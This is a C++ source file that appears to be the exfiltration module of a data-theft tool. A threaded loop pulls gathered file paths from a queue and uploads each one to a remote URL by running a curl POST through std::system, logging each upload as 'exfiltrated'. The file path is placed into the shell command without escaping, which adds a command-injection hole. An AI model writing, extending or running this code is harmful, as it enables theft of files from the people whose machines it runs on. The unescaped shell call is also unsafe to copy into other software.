#include "exfiltrator.h"
#include <iostream>
#include <sstream>
#include <queue>
#include <mutex>
#include <condition_variable>

extern std::queue<std::string> fileQueue;
extern std::mutex exfilMutex;
extern std::condition_variable cv;
extern bool doneGathering;

void exfiltrateFile(const std::string& targetURL) {
    while (true) {
        std::string filePath;
        {
            std::unique_lock<std::mutex> lock(exfilMutex);
            cv.wait(lock, [] { return !fileQueue.empty() || doneGathering; });

            if (fileQueue.empty() && doneGathering) {
                break;
            }

            filePath = fileQueue.front();
            fileQueue.pop();
        }

        std::cout << "[INFO] Exfiltrating file: " << filePath << std::endl;

        std::ostringstream command;
        command << "curl -X POST -F \"file=@" << filePath << "\" " << targetURL;

        int result = std::system(command.str().c_str());

        if (result == 0) {
            std::cout << "[SUCCESS] File exfiltrated: " << filePath << std::endl;
        } else {
            std::cerr << "[ERROR] Failed to exfiltrate file: " << filePath << std::endl;
        }
    }
}
